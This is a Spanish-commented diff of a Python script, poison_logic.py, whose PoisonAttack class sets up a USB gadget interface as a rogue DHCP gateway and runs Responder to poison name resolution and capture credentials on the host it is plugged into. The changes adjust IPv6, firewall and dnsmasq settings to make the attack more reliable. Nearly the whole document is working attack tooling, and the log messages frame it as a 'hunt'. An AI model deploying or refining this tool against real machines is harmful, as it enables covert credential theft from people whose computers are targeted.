@@ -1,4 +1,4 @@
-# poison_logic.py (versión corregida)
+# poison_logic.py (versión con corrección de rango IP y DHCP)
 import os
 import subprocess
 import time
@@ -25,49 +25,31 @@ class PoisonAttack:
             print(texto_limpio)
 
     def _detectar_interfaz_gadget(self):
-        """
-        Busca la interfaz de red que actúa como gadget USB (RNDIS/ECM).
-        Verifica que sea de tipo 1 (Ethernet) y que el dispositivo pertenezca al subsistema 'gadget'.
-        """
-        for iface in os.listdir('/sys/class/net/'):
-            if iface == 'lo':
-                continue
-            type_path = f'/sys/class/net/{iface}/type'
-            if not os.path.exists(type_path):
-                continue
-            with open(type_path) as f:
-                iface_type = f.read().strip()
-            # Las interfaces gadget son Ethernet (tipo 1)
-            if iface_type != '1':
-                continue
-            # Verificar que es un dispositivo USB gadget (enlace simbólico contiene 'gadget')
-            device_path = f'/sys/class/net/{iface}/device'
-            if os.path.exists(device_path):
-                try:
-                    link = os.readlink(device_path)
-                    if 'gadget' in link:
-                        return iface
-                except OSError:
-                    pass
-            # Fallback adicional: nombres comunes
-            if iface.startswith('usb') or iface.startswith('enx'):
-                return iface
-        # Si no se encontró, intentar con nombres conocidos
-        for candidate in ['usb0', 'enx']:
-            if os.path.exists(f'/sys/class/net/{candidate}'):
-                return candidate
-        return 'usb0'  # último recurso
+        """Busca la interfaz de red que actúa como gadget USB (RNDIS/ECM)."""
+        try:
+            for iface in os.listdir('/sys/class/net/'):
+                if iface == 'lo':
+                    continue
+                type_path = f'/sys/class/net/{iface}/type'
+                if os.path.exists(type_path):
+                    with open(type_path) as f:
+                        iface_type = f.read().strip()
+                    # Tipo 1 = Ethernet normal, 772 = gadget Ethernet
+                    if iface_type == '772' or iface.startswith('usb') or iface.startswith('enx'):
+                        if os.path.exists(f'/sys/class/net/{iface}/address'):
+                            return iface
+            if os.path.exists('/sys/class/net/usb0'):
+                return 'usb0'
+        except Exception:
+            pass
+        return 'usb0'  # fallback
 
     def _limpiar_procesos_previos(self):
         os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
         os.system("sudo pkill -f responder > /dev/null 2>&1")
         os.system(f"sudo fuser -k 53/udp > /dev/null 2>&1")
         os.system(f"sudo fuser -k 67/udp > /dev/null 2>&1")
-        # Detener servicios que pueden interferir
-        os.system("sudo systemctl stop systemd-resolved 2>/dev/null")
-        os.system("sudo systemctl stop systemd-networkd 2>/dev/null")
         time.sleep(1)
-
 
     def start(self):
         self._limpiar_procesos_previos()
@@ -89,11 +71,10 @@ class PoisonAttack:
             os.system(f"sudo ip link set {iface} up")
             time.sleep(2)
 
-            # Desactivar IPv6 automático del kernel (evita que el cliente espere SLAAC)
-            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=0 2>/dev/null")  # mantener activo para RA
+            # CRÍTICO PARA LINUX: Evita que NetworkManager espere SLAAC/Router Advertisements
+            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
-            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.forwarding=1 2>/dev/null")
 
             ip = "192.168.10.1"
             subnet_mask = "24"
@@ -105,37 +86,20 @@ class PoisonAttack:
             os.system("sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null")
             os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
 
-            # ===== NUEVO: Configurar IPv6 link‑local para emitir RA =====
-            self.log("[*] Configurando IPv6 link‑local y RA...")
-            os.system(f"sudo ip -6 addr add fe80::1/64 dev {iface} 2>/dev/null")
-            # Permitir tráfico ICMPv6 necesario para RA
-            os.system(f"sudo ip6tables -A INPUT -i {iface} -p icmpv6 --icmpv6-type router-solicitation -j ACCEPT 2>/dev/null")
-            os.system(f"sudo ip6tables -A OUTPUT -o {iface} -p icmpv6 --icmpv6-type router-advertisement -j ACCEPT 2>/dev/null")
-            # ==========================================================
-
-            # ===== Reglas de firewall para DHCP =====
-            self.log("[*] Configurando firewall para DHCP...")
-            os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 67 -j ACCEPT")
-            os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 68 -j ACCEPT")
-            os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --sport 67 -j ACCEPT")
-            # =========================================
-
-            # Configuración dnsmasq (DHCP + RA‑only)
+            # Configuración dnsmasq optimizada para Gadget USB (Linux/Windows)
             config_dhcp = (
                 f"interface={iface}\n"
                 f"listen-address={ip}\n"
-                f"bind-interfaces\n"                     # Necesario para enable‑ra
                 f"dhcp-range={ip_range}\n"
-                f"dhcp-option=3,{ip}\n"
-                f"dhcp-option=6,{ip}\n"
-                f"dhcp-option=15,\n"
-                f"dhcp-option=252,\n"
-                f"no-resolv\n"
-                f"no-hosts\n"
-                f"port=0\n"                              # Sin DNS
-                f"enable-ra\n"                           # Emitir Router Advertisements
-                f"dhcp-range=::,constructor:{iface},ra-only\n"  # Solo RA, sin DHCPv6
-                f"log-dhcp\n"
+                f"dhcp-option=3,{ip}\n"      # Gateway
+                f"dhcp-option=6,{ip}\n"      # DNS
+                f"dhcp-option=15,\n"         # Dominio vacío (evita delay Linux/Windows)
+                f"dhcp-option=252,\n"        # WPAD vacío (evita espera proxy)
+                f"bind-dynamic\n"            # Compatible con interfaces configfs
+                f"no-resolv\n"               # Evita carga de /etc/resolv.conf
+                f"no-hosts\n"                # Ignora /etc/hosts
+                f"port=0\n"                  # DESACTIVA DNS (evita choque con systemd-resolved)
+                f"log-dhcp\n"                # Loguea concesiones DHCP en stderr
             )
             with open("dnsmasq_temp.conf", "w") as f:
                 f.write(config_dhcp)
@@ -147,19 +111,19 @@ class PoisonAttack:
             )
             time.sleep(2)
 
-            # Verificar que dnsmasq esté corriendo
+            # Verificación de que dnsmasq está activo y aceptando DHCP
             if self.dns_proc.poll() is not None:
                 err = self.dns_proc.stderr.read()
                 self.log(f"[!] dnsmasq falló al iniciar: {err.strip()}")
-                self.log("[*] Reintentando en modo foreground...")
+                self.log("[*] Reiniciando en modo fallback...")
                 self.dns_proc = subprocess.Popen(
                     ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d", "--keep-in-foreground"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                 )
             else:
-                self.log("[+] dnsmasq escuchando (DHCP + RA).")
+                self.log("[+] dnsmasq escuchando correctamente.")
 
-            # Detección de Responder
+            # Detección segura de ruta de Responder
             responder_paths = [
                 "/usr/share/responder/Responder.py",
                 "/opt/Responder/Responder.py"
@@ -197,7 +161,6 @@ class PoisonAttack:
         finally:
             self._cleanup()
 
-
     def _cleanup(self):
         self.log("\n[*] Deteniendo procesos y restaurando red...")
         if self.dns_proc:
@@ -218,26 +181,8 @@ class PoisonAttack:
 
         os.system("sudo pkill -f responder > /dev/null 2>&1")
         os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
-
-        # Limpiar reglas de firewall IPv4
-        os.system(f"sudo iptables -D INPUT -i {self.interface} -p udp --dport 67 -j ACCEPT 2>/dev/null")
-        os.system(f"sudo iptables -D INPUT -i {self.interface} -p udp --dport 68 -j ACCEPT 2>/dev/null")
-        os.system(f"sudo iptables -D OUTPUT -o {self.interface} -p udp --sport 67 -j ACCEPT 2>/dev/null")
-
-        # Limpiar reglas IPv6
-        os.system(f"sudo ip6tables -D INPUT -i {self.interface} -p icmpv6 --icmpv6-type router-solicitation -j ACCEPT 2>/dev/null")
-        os.system(f"sudo ip6tables -D OUTPUT -o {self.interface} -p icmpv6 --icmpv6-type router-advertisement -j ACCEPT 2>/dev/null")
-
-        # Quitar dirección IPv6 link‑local
-        os.system(f"sudo ip -6 addr del fe80::1/64 dev {self.interface} 2>/dev/null")
-
         os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
         os.system(f"sudo ip addr flush dev {self.interface} > /dev/null 2>&1")
-
-        # Restaurar servicios detenidos
-        os.system("sudo systemctl start systemd-resolved 2>/dev/null")
-        os.system("sudo systemctl start systemd-networkd 2>/dev/null")
-
         if os.path.exists("dnsmasq_temp.conf"):
             os.remove("dnsmasq_temp.conf")
 
@@ -254,7 +199,6 @@ class PoisonAttack:
             subprocess.run(["sudo", "chmod", "-R", "777", self.session_dir], stderr=subprocess.DEVNULL)
 
         self.log("[+] Sistema restaurado. ¡Cacería finalizada!")
-
 
     def stop(self):
         self.stop_event.set()
